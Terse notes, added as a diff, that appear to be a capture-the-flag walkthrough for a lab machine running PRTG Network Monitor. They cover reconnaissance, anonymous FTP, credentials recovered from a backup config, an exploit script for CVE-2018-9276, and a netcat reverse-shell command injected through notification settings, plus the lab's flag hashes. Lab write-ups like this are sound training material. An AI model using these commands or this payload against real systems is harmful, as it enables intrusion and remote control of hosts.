@@ -1,0 +1,28 @@
+nmap -sC -sV -oN nmap 10.10.10.152 -v -A
+
+port 80 - PRTG Network Monitor
+default creds prtgadmin:prtgadmin dont work
+
+try ftp in anonymous -> `ftp 10.10.10.152` with anonymous:<empty>
+
+get user flag in /Users/Public:
+dd58ce67b49e15105e88096c8d9255a5
+
+then search for default prtg config files location
+-> /programdata/Paessler/PRTG Network Monitor
+
+then get PRTG Configuration files
+-> explore them, find 2018 creds in "PRTG Configuration.old.bak": 
+prtgadmin:PrTg@dmin2018
+
+change it to 2019 -> login successful
+
+exploit CVE-2018-9276
+
+python CVE-2018-9276.py -i 10.10.10.152 -p 80 --lhost 10.10.14.34 --lport 4444 --user prtgadmin --password PrTg@dmin2019
+
+then on site:
+- go to notifications settings
+- check execute commands with `nc 10.10.14.34 4444 -e /bin/sh`
+
+3018977fb944bf1878f75b879fba67cc
